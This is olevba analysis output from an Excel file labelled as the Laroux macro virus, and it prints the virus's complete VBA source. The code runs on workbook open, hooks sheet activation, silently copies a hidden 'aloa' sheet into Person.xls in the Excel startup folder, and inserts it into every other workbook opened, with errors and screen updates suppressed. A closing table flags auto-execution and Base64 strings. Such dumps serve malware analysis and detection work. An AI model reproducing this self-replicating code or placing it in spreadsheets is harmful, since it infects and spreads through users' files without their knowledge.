olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux.jo-671be0e75bcb276de4c6db0a398a83220eca2e33
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO aloa.bas 
in file: Virus.MSExcel.Laroux.jo-671be0e75bcb276de4c6db0a398a83220eca2e33 - OLE stream: '_VBA_PROJECT_CUR/VBA/aloa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

















Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
    On Error Resume Next
    Application.OnSheetActivate = "AutoCopy"
End Sub

Sub AutoCopy()
Attribute AutoCopy.VB_ProcData.VB_Invoke_Func = " \n14"
    Dim sStPath, sFile, swName, swnew, sCurDir As String
    Dim bPtoF, bFtoP As Boolean

    bPtoF = False
    bFtoP = False
    On Error Resume Next
    sStPath = Application.StartupPath
    sFile = Dir(sStPath & "\" & "Person.xls")

    bFtoP = sFile <> "Person.xls"

    bPtoF = Not (bFtoP And (ActiveWorkbook.Modules.Count > 0))

    If bFtoP Then
        Application.ScreenUpdating = False
        swName = ActiveWorkbook.Name
        Sheets("aloa").Visible = True
        Sheets("aloa").Select
        Sheets("aloa").Copy
        swnew = ActiveWorkbook.Name
        sCurDir = CurDir()

        ChDir Application.StartupPath
        ActiveWindow.Visible = False
        Workbooks(swnew).SaveAs FileName:=Application.StartupPath & "/" & "Person.xls", FileFormat:=xlNormal _
            , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
            False, CreateBackup:=False
        ChDir sCurDir
        Workbooks(swName).Sheets("aloa").Visible = False
        ActiveWindow.ActivateNext
    End If

    If bPtoF And (Not bFtoP) Then
        swnew = ActiveWorkbook.Name
        Application.ScreenUpdating = False
        sCurDir = ActiveWorkbook.Path
        If Workbooks(swnew).Sheets(1).Name <> "aloa" Then
            Workbooks("Person.xls").Sheets("aloa").Copy before:=Workbooks(swnew).Sheets(1)
            Workbooks(swnew).Sheets("aloa").Visible = False
            Workbooks(swnew).Save
        End If
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "Person.xls!AutoCopy"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     12 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  alo
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

